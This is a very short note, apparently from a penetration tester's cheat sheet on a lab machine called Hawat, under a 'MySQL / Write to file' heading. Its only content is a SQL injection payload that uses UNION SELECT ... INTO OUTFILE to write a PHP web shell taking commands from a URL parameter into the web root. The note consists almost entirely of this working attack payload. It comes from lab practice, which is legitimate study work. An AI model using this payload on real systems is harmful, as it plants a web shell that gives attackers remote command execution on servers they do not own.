## MySQL
#### Write to file
From the **Hawat** PG machine


```bash
UNION SELECT (<?php echo exec($_GET["cmd"]);) INTO OUTFILE '/srv/http/cmd.php'

```